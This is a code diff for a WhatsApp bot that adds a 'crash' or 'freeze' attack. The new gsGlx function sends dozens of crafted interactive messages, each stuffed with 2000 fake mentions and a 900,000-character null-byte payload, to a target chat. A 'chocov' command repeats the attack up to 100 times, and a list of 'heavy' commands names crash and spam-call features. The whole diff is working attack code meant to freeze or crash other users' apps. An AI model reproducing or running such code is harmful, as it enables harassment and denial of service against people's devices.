@@ -49,7 +49,7 @@ const telapreta = `${bug}`
 const { bugUrl } = require('./travas/bugUrl.js')
 const heavyCommands = new Set([
     'crashhome-ios', 'atraso-ui', 'atraso-v3', 'document-crash',
-    'crash-button', 'chat-freeze'
+    'crash-button', 'chat-freeze', 'ui-image', 'spam-call',
 ]);
 /*const heavyAssets = {
     ios4: fs.readFileSync('./travas/ios4.js'),
@@ -763,7 +763,32 @@ async function frezeui(conn, target) {
 
 
 
-
+async function gsGlx(target, zid = true) {
+  for(let z = 0; z < 75; z++) {
+    let msg = generateWAMessageFromContent(target, {
+      interactiveResponseMessage: {
+        contextInfo: {
+          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
+        }, 
+        body: {
+          text: "7eppeli - Expos3d",
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "galaxy_message",
+          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
+          version: 3
+        }
+      }
+    }, {});
+  
+    await conn.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: msg.message
+      }
+    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
+  }
+}
 
 
 
@@ -774,14 +799,21 @@ case "chocov": {
     if (!isBot && !isCreator) return;
 
     
+const target = m.chat; //
+        const rawText = (m.text || m.message?.conversation || "").trim(); //
+        const found = rawText.match(/(\d+)/); //
+        let times = found ? parseInt(found[1], 10) : 1; //
+        if (isNaN(times) || times < 1) times = 1; //
+        const MAX_SENDS = 100; //
+        if (times > MAX_SENDS) times = MAX_SENDS;
 
-    let isTarget = m.chat
-    for (let i = 0; i < 5; i++) {
-  await UiImage(conn, isTarget)
+
+    for (let i = 0; i < times; i++) {
+  await gsGlx(target, zid = true)
       await sleep(5000);
-  await UiImage(conn, isTarget)
+  await gsGlx(target, zid = true)
       await sleep(5000);
-  await UiImage(conn, isTarget)
+  await gsGlx(target, zid = true)
      await sleep(3000);    
   }
     conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
